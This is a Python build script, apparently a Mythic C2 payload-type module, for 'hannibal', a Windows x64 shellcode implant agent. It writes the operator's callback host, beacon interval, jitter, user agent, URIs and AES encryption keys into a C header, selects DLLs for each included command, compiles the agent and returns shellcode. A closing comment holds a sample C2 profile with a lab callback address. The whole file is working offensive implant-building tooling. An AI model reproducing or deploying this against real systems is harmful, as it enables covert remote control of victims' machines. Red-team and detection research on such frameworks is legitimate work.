# TODO: Cleanup.

import base64
import shutil
import pathlib
import os, fnmatch, tempfile, sys, asyncio, subprocess, re

from mythic_container.MythicRPC import *
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *


class hannibal(PayloadType):
    
    name = "hannibal"
    file_extension = "bin"
    author = "@silentwarble"
    mythic_encrypts = True
    translation_container = "hannibal_python_translator"

    supported_os = [
        SupportedOS.Windows
    ]

    version = "v1.0.0"
    wrapper = False
    wrapped_payloads = []

    note = """
        Microsoft Windows x64 PIC Agent (Stardust) written in C. Version: {}
    """.format(version)

    supports_dynamic_loading = True

    build_parameters = [
        BuildParameter(
            name = "output_type",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["shellcode"],
            default_value="shellcode",
            description="Output as shellcode.",
        )
    ]

    c2_profiles = ["http"]

    base_path = pathlib.Path(".")
    agent_path = pathlib.Path(".") / "hannibal" / "mythic"
    agent_code_path = pathlib.Path(".") / "hannibal" / "agent_code"
    agent_icon_path = agent_path / "agent_functions" / "hannibal.svg"
    hannibal_path = pathlib.Path(".") / agent_code_path / "Hannibal"

    build_steps = [
        BuildStep(step_name="Config", step_description="Inserting Configuration Into config.h"),
        BuildStep(step_name="Compile", step_description="Compile"),
        BuildStep(step_name="Finish", step_description="Finish"),
    ]

    async def build(self) -> BuildResponse:

        resp = BuildResponse(status=BuildStatus.Error)

        original_dir = os.getcwd()

        os.chdir(self.hannibal_path)

        for listener in self.c2info:

            config_dict = {}

            profile = listener.get_c2profile()

            for key, val in listener.get_parameters_dict().items():
                if (key == "callback_host"):
                    if ("://" in val):
                        config_dict["callback_host"] = val.split('://')[-2:][1]
                        config_dict["callback_protocol"] = val.split('://')[-2:][0]
                    else:
                        config_dict["callback_host"] = val
                        config_dict["callback_protocol"] = "HTTPS"
                elif (key == "callback_interval"):
                    config_dict["callback_interval"] = val
                elif (key == "callback_jitter"):
                    config_dict["callback_jitter"] = val
                elif (key == "headers"):
                    config_dict["user_agent"] = val["User-Agent"]
                elif (key == "get_uri"):
                    config_dict["get_uri"] = val
                elif (key == "post_uri"):
                    config_dict["post_uri"] = val
                elif (key == "AESPSK"):
                    config_dict["enc_key"] = val["enc_key"]
                    config_dict["dec_key"] = val["dec_key"]


        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
            PayloadUUID=self.uuid,
            StepName="Config",
            StepStdout='Inserting Config',
            StepSuccess=True
        ))

        # Which DLLs each command requires. If command is not included in build, do not load that dll.
        dll_required = {
            "REQUIRE_DLL_NTDLL" : [], # Always included
            "REQUIRE_DLL_KERNEL32" : [], # Always included
            "REQUIRE_DLL_WININET": [], # At the moment this is the only networking library available. TODO: Add WinHTTP or other options.
            "REQUIRE_DLL_BCRYPT": [], # Used throughout the agent. Always included. TODO: Refactor so it's optional.
            "REQUIRE_DLL_ADVAPI32": [], # Needed for multiple things including Ekko sleep. TODO: Refactor so it's optional.
            "REQUIRE_DLL_IPHLPAPI": ["INCLUDE_CMD_IPINFO", "INCLUDE_CMD_WHOAMI"],
            "REQUIRE_DLL_WS2_32": ["INCLUDE_CMD_IPINFO"],
        }

        # {config_dict["callback_protocol"]}://
        line = "#define PIC_BUILD\n" 
        line += "#define PROFILE_MYTHIC_HTTP\n" 
        line += f'#define CONFIG_SLEEP {config_dict["callback_interval"]}\n'
        line += f'#define CONFIG_SLEEP_JITTER {config_dict["callback_jitter"]}\n'
        line += f'#define CONFIG_HOST L"{config_dict["callback_host"]}"\n'
        line += f'#define CONFIG_UA L"{config_dict["user_agent"]}"\n'
        line += f'#define CONFIG_POST_URI L"/{config_dict["post_uri"]}"\n'
        line += f'#define CONFIG_UUID "{self.uuid}"\n'
        enc_key = base64.b64decode(config_dict["enc_key"])
        dec_key = base64.b64decode(config_dict["dec_key"])
        enc_key_str = '{ ' + ', '.join(f'0x{byte:02x}' for byte in enc_key) + ' }'
        dec_key_str = '{ ' + ', '.join(f'0x{byte:02x}' for byte in dec_key) + ' }'
        line += f'#define CONFIG_ENCRYPT_KEY {enc_key_str}\n'

        included_commands = [f"INCLUDE_CMD_{x.upper()}" for x in self.commands.get_commands()]

        added_dlls = set()

        for cmd in included_commands:
            for dll_key, required_cmds in dll_required.items():
                if cmd in required_cmds and dll_key not in added_dlls:
                    line += f'#define {dll_key}\n'
                    added_dlls.add(dll_key)  

        # For now these are required
        line += "#define REQUIRE_DLL_NTDLL\n"
        line += "#define REQUIRE_DLL_KERNEL32\n"
        line += "#define REQUIRE_DLL_ADVAPI32\n"
        line += "#define REQUIRE_DLL_WININET\n"
        line += "#define REQUIRE_DLL_BCRYPT\n"

        for cmd in included_commands:
            line += f'#define {cmd}\n'

        with open('include/config.h', 'w') as output_file:
            output_file.writelines(line)

        if(self.get_parameter("output_type") == "shellcode"):

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Compile",
                StepStdout='Building Hannibal',
                StepSuccess=True
            ))


            try:
                result = subprocess.run(['make', '-f', f'linux_makefile'], check=True, text=True, capture_output=True)
            except subprocess.CalledProcessError as e:
                resp.build_stderr = f"Error during make: {e.stderr}"
                resp.set_status(BuildStatus.Error)
                os.chdir(original_dir)
                return resp
               

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Finish",
                StepStdout='Finish',
                StepSuccess=True
            ))

            resp.payload = open('bin/hannibal.bin', 'rb').read()
            resp.build_stdout = "Download Bin"
            resp.set_status(BuildStatus.Success)
            os.chdir(original_dir)
            return resp
           

# For reference, the dict you get from the HTTP C2 Profile:
# dict_items(
# [
#     ('AESPSK', {'dec_key': None, 'enc_key': None, 'value': 'none'}), 
#     ('callback_host', 'http://10.10.10.54'), 
#     ('callback_interval', 10), 
#     ('callback_jitter', 23), 
#     ('callback_port', 80), 
#     ('encrypted_exchange_check', False), 
#     ('get_uri', 'index'), 
#     ('headers', {'User-Agent': 'TESTUA'}), 
#     ('killdate', '2025-01-17'), 
#     ('post_uri', 'data'), 
#     ('proxy_host', ''), 
#     ('proxy_pass', ''), 
#     ('proxy_port', ''), 
#     ('proxy_user', ''), 
#     ('query_path_name', 'q')
# ]
# )

